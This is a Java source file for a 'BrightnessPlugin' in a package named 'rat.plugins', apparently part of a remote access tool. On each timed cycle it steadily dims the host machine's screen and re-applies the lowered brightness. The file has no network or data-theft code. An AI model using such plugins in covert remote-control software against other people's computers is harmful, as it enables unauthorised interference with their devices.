package rat.plugins.brightness;

import rat.plugins.AbstractPlugin;
import rat.plugins.Task;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;

public class BrightnessPlugin extends AbstractPlugin
{
    private double oldBrightness;
    private double brightness;

    private long duration;

    private Timer timer;

    private AtomicBoolean done = new AtomicBoolean(true);

    public BrightnessPlugin(double initialBrightness, long duration)
    {
        this.brightness = initialBrightness;
        this.duration = duration;
        this.timer = new Timer();
    }

    @Override
    public byte getByte()
    {
        return 1;
    }

    @Override
    public void initialize()
    {
        try
        {
            BrightnessUtil.setBrightness(brightness);
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void onTick()
    {
        if (done.get())
        {
            done.set(false);

            timer.schedule(new TimerTask()
            {
                @Override
                public void run()
                {
                    oldBrightness = brightness;
                    brightness -= 0.05;

                    new Thread(new BrightnessDecrementerTask(oldBrightness, brightness)).start();
                }
            }, duration);
        }
        else
        {
            try
            {
                BrightnessUtil.setBrightness(brightness);
                Thread.sleep(1000);
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
            catch (InterruptedException e)
            {
                e.printStackTrace();
            }
        }
    }

    public class BrightnessDecrementerTask implements Task
    {
        double oldBrightness;
        double brightness;

        BrightnessDecrementerTask(double oldBrightness, double brightness)
        {
            this.oldBrightness = oldBrightness;
            this.brightness = brightness;
        }

        @Override
        public void run()
        {
            try
            {
                for (double i = oldBrightness; i >= brightness; i -= 0.005)
                {
                    BrightnessUtil.setBrightness(i);

                    Thread.sleep(500);
                }
            }
            catch (IOException | InterruptedException e)
            {
                e.printStackTrace();
            }

            done.set(true);
        }
    }
}
